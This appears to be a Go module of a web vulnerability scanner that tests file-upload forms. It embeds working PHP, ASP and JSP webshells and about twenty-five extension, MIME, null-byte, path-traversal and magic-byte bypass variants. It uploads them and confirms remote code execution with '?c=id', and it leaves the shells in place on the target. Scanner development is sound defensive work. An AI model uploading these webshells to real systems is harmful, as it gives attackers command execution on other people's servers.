// Package upload detects insecure file upload vulnerabilities.
// Attempts webshell upload via MIME bypass, double extension, null byte,
// and alternative extension attacks; confirms RCE by requesting the uploaded file.
package upload

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"net/url"
	"path"
	"strings"

	"github.com/erebus/scanner/internal/client"
	"github.com/erebus/scanner/internal/crawler"
	"github.com/erebus/scanner/internal/modules"
)

const (
	webshellPHP  = `<?php if(isset($_GET['c'])){echo shell_exec($_GET['c']);}?>`
	webshellASP  = `<% Response.Write(CreateObject("WScript.Shell").Exec(Request("c")).StdOut.ReadAll()) %>`
	webshellJSP  = `<% Runtime rt = Runtime.getRuntime(); String[] c={"/bin/sh","-c",request.getParameter("c")}; Process p=rt.exec(c); java.util.Scanner sc=new java.util.Scanner(p.getInputStream()); while(sc.hasNextLine()){out.println(sc.nextLine());} %>`
	rceCheckPath = "?c=id"
	rceMarker    = "uid="
)

type uploadProbe struct {
	filename    string
	contentType string
	content     string
	label       string
}

func buildProbes(token string) []uploadProbe {
	phpName := "img_" + token
	return []uploadProbe{
		// Straight PHP
		{phpName + ".php", "application/x-php", webshellPHP, "direct .php"},
		// Alternative PHP extensions
		{phpName + ".php3", "application/octet-stream", webshellPHP, ".php3"},
		{phpName + ".php4", "application/octet-stream", webshellPHP, ".php4"},
		{phpName + ".php5", "application/octet-stream", webshellPHP, ".php5"},
		{phpName + ".phtml", "application/octet-stream", webshellPHP, ".phtml"},
		{phpName + ".phar", "application/octet-stream", webshellPHP, ".phar"},
		{phpName + ".shtml", "application/octet-stream", webshellPHP, ".shtml"},
		// Case bypass
		{phpName + ".PHP", "application/octet-stream", webshellPHP, ".PHP uppercase"},
		{phpName + ".PhP", "application/octet-stream", webshellPHP, ".PhP mixed"},
		// MIME bypass: image/jpeg with PHP content
		{phpName + ".php", "image/jpeg", webshellPHP, "MIME=image/jpeg"},
		{phpName + ".php", "image/png", webshellPHP, "MIME=image/png"},
		{phpName + ".php", "image/gif", webshellPHP, "MIME=image/gif"},
		// Double extension
		{phpName + ".php.jpg", "image/jpeg", webshellPHP, "double ext .php.jpg"},
		{phpName + ".jpg.php", "image/jpeg", webshellPHP, "double ext .jpg.php"},
		{phpName + ".php.jpg", "image/png", webshellPHP, "double ext MIME bypass"},
		// Null byte bypass (legacy servers / PHP < 5.3.4)
		{phpName + ".php\x00.jpg", "image/jpeg", webshellPHP, "null byte \\x00"},
		{phpName + ".php%00.jpg", "image/jpeg", webshellPHP, "null byte %00"},
		// Content-Disposition filename with path traversal
		{"../../" + phpName + ".php", "image/jpeg", webshellPHP, "path traversal filename"},
		{"..%2F..%2F" + phpName + ".php", "image/jpeg", webshellPHP, "encoded path traversal"},
		// GIF magic bytes prepended (GIF89a; trick)
		{phpName + ".php", "image/gif", "GIF89a;" + webshellPHP, "GIF89a magic bytes"},
		// Polyglot — valid JPEG header with PHP appended
		{phpName + ".php", "image/jpeg", "\xff\xd8\xff\xe0" + webshellPHP, "JPEG magic bytes"},
		// ASP/ASPX variants
		{phpName + ".asp", "text/plain", webshellASP, "ASP webshell"},
		{phpName + ".aspx", "text/plain", webshellASP, "ASPX webshell"},
		{phpName + ".asa", "text/plain", webshellASP, ".asa (IIS)"},
		// JSP
		{phpName + ".jsp", "text/plain", webshellJSP, "JSP webshell"},
		{phpName + ".jspx", "text/plain", webshellJSP, "JSPX webshell"},
	}
}

type Module struct {
	client *client.Client
}

func New(c *client.Client) *Module { return &Module{client: c} }
func (m *Module) Name() string     { return "upload" }

func (m *Module) Run(ctx context.Context, page crawler.Page) ([]modules.Finding, error) {
	var findings []modules.Finding

	for _, form := range page.Forms {
		if !hasFileField(form) {
			continue
		}
		if ctx.Err() != nil {
			break
		}
		token := randToken()
		probes := buildProbes(token)

		for _, probe := range probes {
			if ctx.Err() != nil {
				break
			}
			uploadedURL, respBody, err := m.sendUpload(ctx, form, probe)
			if err != nil {
				continue
			}

			rceFound := false
			for _, candidate := range guessUploadURLs(page.URL, uploadedURL, probe.filename) {
				if f := m.confirmRCE(ctx, candidate, probe, page.URL, respBody); f != nil {
					findings = append(findings, *f)
					rceFound = true
					break
				}
			}
			if rceFound {
				break
			}

			// Even if RCE not confirmed, flag if upload returned 200 with a file path
			if uploadedURL != "" && !strings.Contains(probe.label, "direct .php") {
				findings = append(findings, modules.Finding{
					Module:   "upload",
					Severity: modules.High,
					URL:      form.Action,
					Param:    fileFieldName(form),
					Payload:  probe.filename,
					Evidence: fmt.Sprintf("File upload accepted (%s): server returned path %q", probe.label, uploadedURL),
					Detail: fmt.Sprintf("Unrestricted file upload: server accepted %q (%s). "+
						"Could allow webshell upload if file is served from a web-accessible path.", probe.filename, probe.label),
					CWE:         "CWE-434",
					CVSS:        8.8,
					CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
					Confidence:  modules.Likely,
					Remediation: "Validate file extension and MIME type server-side; store uploads outside web root; rename uploaded files; disable PHP execution in upload directories",
					Tags:        []string{"upload", "unrestricted-upload", "cwe-434"},
				})
			}
		}
	}
	return findings, nil
}

func (m *Module) sendUpload(ctx context.Context, form crawler.Form, probe uploadProbe) (uploadedPath string, respBody string, err error) {
	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)

	// Copy regular form fields
	for _, f := range form.Fields {
		if f.Type == "file" {
			continue
		}
		if f.Type == "submit" || f.Type == "button" {
			continue
		}
		val := f.Value
		if val == "" {
			val = "test"
		}
		_ = mw.WriteField(f.Name, val)
	}

	// File field
	fieldName := fileFieldName(form)
	part, perr := mw.CreatePart(fileHeader(fieldName, probe.filename, probe.contentType))
	if perr != nil {
		return "", "", perr
	}
	if _, werr := io.WriteString(part, probe.content); werr != nil {
		return "", "", werr
	}
	mw.Close()

	req, err := http.NewRequestWithContext(ctx, "POST", form.Action, &buf)
	if err != nil {
		return "", "", err
	}
	req.Header.Set("Content-Type", mw.FormDataContentType())

	resp, err := m.client.Do(req)
	if err != nil {
		return "", "", err
	}
	body, _ := client.ReadBody(resp)
	bodyStr := string(body)

	// Try to extract an uploaded file path from the response
	uploadedPath = extractFilePath(bodyStr)
	return uploadedPath, bodyStr, nil
}

func (m *Module) confirmRCE(ctx context.Context, fileURL string, probe uploadProbe, pageURL string, uploadResp string) *modules.Finding {
	if fileURL == "" {
		return nil
	}
	rceURL := fileURL + rceCheckPath
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, rceURL, nil)
	if err != nil {
		return nil
	}
	resp, err := m.client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := client.ReadBody(resp)
	bodyStr := string(body)

	if !strings.Contains(bodyStr, rceMarker) {
		return nil
	}

	idxOut := strings.Index(bodyStr, rceMarker)
	cmdOutput := ""
	if idxOut != -1 {
		end := idxOut + 100
		if end > len(bodyStr) {
			end = len(bodyStr)
		}
		cmdOutput = strings.TrimSpace(bodyStr[idxOut:end])
		if nl := strings.Index(cmdOutput, "\n"); nl != -1 {
			cmdOutput = cmdOutput[:nl]
		}
	}

	return &modules.Finding{
		Module:   "upload",
		Severity: modules.Critical,
		URL:      pageURL,
		Param:    fileFieldName2(probe.filename),
		Payload:  probe.filename + " + " + rceCheckPath,
		Evidence: fmt.Sprintf("RCE confirmed via webshell upload (%s): 'id' output: %s", probe.label, cmdOutput),
		Detail: fmt.Sprintf("Unrestricted file upload → RCE: webshell uploaded as %q using %s bypass. "+
			"Shell accessible at %q. Command 'id' returned: %s",
			probe.filename, probe.label, fileURL, cmdOutput),
		CWE:         "CWE-434",
		CVSS:        10.0,
		CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
		Confidence:  modules.Confirmed,
		Remediation: "Block execution in upload directory (e.g. .htaccess deny php); validate MIME and extension server-side; rename uploaded files; store outside web root",
		Tags:        []string{"upload", "rce", "webshell", "unrestricted-upload", "cwe-434"},
		Extracted:   cmdOutput,
	}
}

func fileHeader(fieldName, filename, contentType string) textproto.MIMEHeader {
	h := make(textproto.MIMEHeader)
	h.Set("Content-Disposition",
		fmt.Sprintf(`form-data; name="%s"; filename="%s"`, escapeQuotes(fieldName), escapeQuotes(filename)))
	h.Set("Content-Type", contentType)
	return h
}

func escapeQuotes(s string) string {
	return strings.NewReplacer(`\`, `\\`, `"`, `\"`).Replace(s)
}

func hasFileField(form crawler.Form) bool {
	for _, f := range form.Fields {
		if f.Type == "file" {
			return true
		}
	}
	return false
}

func fileFieldName(form crawler.Form) string {
	for _, f := range form.Fields {
		if f.Type == "file" {
			return f.Name
		}
	}
	return "file"
}

func fileFieldName2(filename string) string {
	return path.Base(filename)
}

// extractFilePath looks for a URL or path in the response that likely points to the uploaded file.
func extractFilePath(body string) string {
	body = strings.ToLower(body)
	for _, prefix := range []string{"/uploads/", "/upload/", "/files/", "/media/", "/static/", "/assets/", "/img/", "/images/"} {
		if idx := strings.Index(body, prefix); idx != -1 {
			end := idx
			for end < len(body) && body[end] != '"' && body[end] != '\'' && body[end] != ' ' && body[end] != '<' && body[end] != '\n' {
				end++
			}
			if end > idx+1 {
				return body[idx:end]
			}
		}
	}
	return ""
}

// guessUploadURLs returns candidate URLs where the uploaded file might be served.
// If the upload response contained a path, that is the only candidate.
// Otherwise, common upload directories are returned for the caller to probe.
func guessUploadURLs(pageURL, extractedPath, filename string) []string {
	if extractedPath != "" {
		base, err := url.Parse(pageURL)
		if err != nil {
			return nil
		}
		rel, err := url.Parse(extractedPath)
		if err != nil {
			return []string{extractedPath}
		}
		return []string{base.ResolveReference(rel).String()}
	}
	base, err := url.Parse(pageURL)
	if err != nil {
		return nil
	}
	fname := path.Base(filename)
	var candidates []string
	for _, dir := range []string{"/uploads/", "/upload/", "/files/", "/media/"} {
		candidates = append(candidates, (&url.URL{
			Scheme: base.Scheme,
			Host:   base.Host,
			Path:   dir + fname,
		}).String())
	}
	return candidates
}

func randToken() string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 8)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}
